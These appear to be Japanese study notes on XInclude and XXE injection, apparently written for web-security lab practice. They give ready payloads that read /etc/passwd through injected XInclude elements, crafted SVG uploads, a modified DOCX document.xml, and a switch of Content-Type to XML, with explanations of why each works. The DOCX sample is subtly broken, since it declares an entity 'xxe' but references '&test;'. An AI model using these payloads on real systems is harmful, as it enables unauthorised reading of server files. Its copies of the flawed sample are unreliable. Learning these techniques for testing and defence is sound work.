## Xinclude 攻撃

1. APIにリクエストしてそうな部分を見つける
```http
productId=1&storeId=1
```

2. サーバがXMLを解析するか以下のリクエストのエラーメッセージ等から判断する

- 2-1: Extension->[Content Type Converter](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278)でXMLへ変換して送信
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<root>
    <productId>1</productId>
    <storeId>1</storeId>
</root>
```
- `<root>`と`</root>`は削除してもいい

- 2-2: エンティティを注入する
```http
productId=%26entity;&storeId=1
```

3. Xinclude攻撃ペイロードを注入する
```http
productId=1<hoge xmlns:xi="http://www.w3.org/2001/XInclude"> 
<xi:include parse="text" href="file:///etc/passwd"/></hoge>&storeId=1
```

###### Xinclude攻撃の原理

- XMLがリクエストに見当たらなくても、クライアントから送信されたデータを受け取り、それをサーバ側でXML文書に埋め込み、そのXML文書を解析するものがある
- 例えば、[📕](../../Misc/📕.md#SOAP)など。サーバはクライアントから送信されたデータをSOAP リクエストに入れ、バックエンドシステムに送り、バックエンドのSOAP サービスで処理する
- XML文書すべてのコントロールはできなくても、一部を注入してサーバに渡すことができる

###### Xinclude攻撃の例

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> 
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
- `xmlns:xi`: XMLのName Space(名前空間) + 識別名
	- 名前空間：同じ名前の要素や属性が異なる意味で定義されている場合に、XMLパーサが区別できるようにURIを割り当てる。
- `http://www.w3.org/2001/XInclude`: 実際に存在するURIでなくてもいい。ただし、識別名`xi`が何をさしてるか他の人にもわかるように、正式なURLを指定することが多い。

###### 参考

- [Wikipedia: XML Inclusions](https://ja.wikipedia.org/wiki/XML_Inclusions):具体的な構文など
- [XML名前空間](https://atmarkit.itmedia.co.jp/aig/01xml/namespace.html)

### fileアップロードによるXXE攻撃方法

- 期待されるファイル形式がJPEG/PNG → SVG
```svg
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://[filename]" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

- 期待されるファイル形式がTXTなど文書 → DOCX　[4. 隠れたXXEi脆弱性の発見](#DOCXへXXEiする方法)

3. ファイルをアップロードし、アップロードしたファイルを開いて結果を見る

- **＊**：もしレスポンスがなければOASTを使用する [3. Blind XXE](3.%20Blind%20XXE.md#OASTテクニックが使用できる場合のBlind%20XXE%20w/Collaborator)

### DOCXへXXEiする方法

1. DOCXファイルを用意する。[Office Web](https://www.microsoft.com/ja-jp/microsoft-365/free-office-online-for-the-web)
2. 解凍する
```zsh
unzip xxe.docx

Archive:  xxe.docx
...
  inflating: word/document.xml       
  inflating: _rels/.rels             
...
```

3. VS codeの上のタブのファイル->フォルダーを開く->wordフォルダを開き、`document.xml`を以下に書き換える
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<w:document xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" mc:Ignorable="w14 wp14"><w:body><w:p><w:pPr><w:pStyle w:val="Normal"/><w:bidi w:val="0"/><w:jc w:val="left"/><w:rPr></w:rPr></w:pPr><w:r><w:rPr></w:rPr><w:t>&test;</w:t></w:r></w:p><w:sectPr><w:type w:val="nextPage"/><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:left="1134" w:right="1134" w:header="0" w:top="1134" w:footer="0" w:bottom="1134" w:gutter="0"/><w:pgNumType w:fmt="decimal"/><w:formProt w:val="false"/><w:textDirection w:val="lrTb"/></w:sectPr></w:body></w:document>
```

4. 編集した`document.xml`を使用して、docxを再度zipする
```zsh
zip xxe.docx word/document.xml
```
- [参考記事：DOCX XXE](https://medium.com/@x3rz/hackpack-ctf-2021-indead-v2-df9ddb4b4083)

5. ファイルをアップロードし、アップロードしたファイルを見る

###### fileアップロードがXXE攻撃へつながる原理

- Office文書のDOCXやSVGのような画像形式など、XMLを使用したファイル形式がある
- アプリケーションがXMLを使用しているファイル形式と似たファイル形式をアップロードされると期待している時、XMLを使用しているファイル形式のファイルをアップロードすることができる可能性がある。
	- JPEGやPNGを期待 → SVGを受け入れるかも
	- TXTを期待 → DOCXを受け入れるかも。DOCX ≒ 圧縮されたXMLファイル

## Content-Type編集によるXXE攻撃

1. POSTリクエストを以下のように編集し、サーバがXMLでも通常通りの結果を返すか確認する
```http
POST /action HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 7 

foo=bar
```
	↓
```http
POST /action HTTP/1.0 
Content-Type: text/xml 
Content-Length: 52 

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
